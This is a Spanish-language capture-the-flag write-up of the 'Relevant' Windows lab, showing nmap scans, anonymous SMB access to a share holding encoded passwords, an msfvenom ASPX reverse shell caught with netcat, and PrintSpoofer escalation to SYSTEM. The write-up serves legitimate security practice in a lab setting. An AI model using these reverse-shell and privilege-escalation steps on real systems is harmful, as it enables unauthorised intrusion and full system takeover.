---
Titulo: Relevant
Fecha: 06-11-2025 y 12-11-2025
categoria: []
Dificultad_oficial: Media
Dificultad_percibida: Media/Dificil
Estado: Terminado
---
## 1. Descripción del reto
Alcance del trabajo

El cliente solicita que un ingeniero realice una evaluación del entorno virtual proporcionado. Ha pedido que se proporcione la mínima información posible sobre la evaluación, deseando que se realice desde la perspectiva de un atacante (prueba de penetración de caja negra). El cliente ha solicitado que se obtengan dos flags (sin especificar la ubicación) como prueba de explotación.

- Usuario.txt
- Root.txt  

Además, el cliente ha proporcionado las siguientes concesiones de alcance:

- En esta actividad se permite el uso de cualquier herramienta o técnica; sin embargo, les pedimos que intenten primero la explotación manual.  
    
- Localice y registre todas las vulnerabilidades encontradas.
- Envía las alertas detectadas al panel de control.
- Solo la dirección IP asignada a su máquina está dentro del alcance.
- Detectar e informar sobre TODAS las vulnerabilidades (sí, hay más de una ruta para obtener acceso root).

## 2. Enumeración / Reconocimiento
Vamos a iniciar este escaneo como siempre con la herramienta `nmap` para descubrir los puertos que tiene abierta la máquina. Esto nos ayudara a tener una mejor idea de a que nos enfrentamos. Además este reto al ser una simulación lo más realista posible, vemos que tenemos una máquina de caja negra en la cual únicamente solo conocemos la IP de la victima, que en mi caso va a ser variable, pero la que tengo actualmente es *10.10.186.250*. 
Lo primero que voy a hacer es asegurarme de estar en la misma red que la máquina objetivo, esto lo hare mediante un "Ping" 

```shell
┌──(kali㉿Odon)-[~]
└─$ ping 10.10.186.250 -c 4
PING 10.10.186.250 (10.10.186.250) 56(84) bytes of data.
64 bytes from 10.10.186.250: icmp_seq=1 ttl=127 time=67.0 ms
64 bytes from 10.10.186.250: icmp_seq=2 ttl=127 time=67.5 ms
64 bytes from 10.10.186.250: icmp_seq=3 ttl=127 time=66.9 ms
64 bytes from 10.10.186.250: icmp_seq=4 ttl=127 time=67.6 ms

--- 10.10.186.250 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 66.857/67.248/67.602/0.331 ms
```

Vale, con esta pequeña información ya tenemos dos datos muy importantes, el objetivo principal tener conexión lo tenemos, pero en el campo **TTL** nos da una información muy relevante su valor es 127, por lo que lo más seguro es que sea una máquina Windows y no Linux.
Ahora si, vamos a ir con nmap viendo los puntos que podemos sacar.

```shell
┌──(kali㉿Odon)-[~]
└─$ nmap -sS -Pn -sV -O --min-rate 5000 --open -p- 10.10.186.250     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 05:54 EST
Nmap scan report for 10.10.186.250
Host is up (0.067s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.95 seconds
```

Vale, aquí tenemos información más que relevante, primero que nada vemos los puertos abiertos (y sus versiones) son los típicos de un "Windows Server", segundo vemos que tiene una pagina web tanto en el puerto 80 como en el 49663. Ya más abajo confirmamos que es un servidor Windows, por lo que no nos equivocamos.
Ahora voy a lanzar otro escaneo para ver que más información puedo extraer de los puertos.

```shell
┌──(kali㉿Odon)-[~]
└─$ nmap -sS -sC -sV -Pn -p 80,135,139,445,3389,49663,49666,49667 10.10.186.250
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 06:01 EST
Nmap scan report for 10.10.186.250
Host is up (0.067s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-06T11:02:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2025-11-05T10:38:18
|_Not valid after:  2026-05-07T10:38:18
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-11-06T11:02:18+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-06T03:02:23-08:00
| smb2-time: 
|   date: 2025-11-06T11:02:19
|_  start_date: 2025-11-06T10:38:18
|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.75 seconds
```

Sin mucha información relevante (O eso pienso), me voy a la pagina web.
no hay nada seguir con smbclient

```shell
┌──(kali㉿Odon)-[~]
└─$ smbclient -L 10.10.77.148 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.77.148 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## 3. Explotación / Desarrollo

```shell
┌──(kali㉿Odon)-[~/RELEVANT]
└─$ smbclient \\\\10.10.134.12\\nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5136584 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
smb: \> exit
┌──(kali㉿Odon)-[~/RELEVANT]
└─$ ls    
passwords.txt
┌──(kali㉿Odon)-[~/RELEVANT]
└─$ cat passwords.txt         
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

```shell
┌──(kali㉿Odon)-[~/RELEVANT]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.136.219 LPORT=4444 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3430 bytes
Saved as: rev.aspx
                                                                                                                                                            
┌──(kali㉿Odon)-[~/RELEVANT]
└─$ ls
hola.txt  passwords.txt  rev.aspx
```

```shell
┌──(kali㉿Odon)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.136.219] from (UNKNOWN) [10.10.21.26] 49912
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\Users\Bob\Desktop>whoami
whoami
iis apppool\defaultapppool
```

```shell imp=13
PS C:\windows\system32\inetsrv> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

```shell
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
## 6. Notas y aprendizajes

- Punto fuerte: ...
    
- Dificultad encontrada: ...
    
- Conceptos nuevos aprendidos: ...
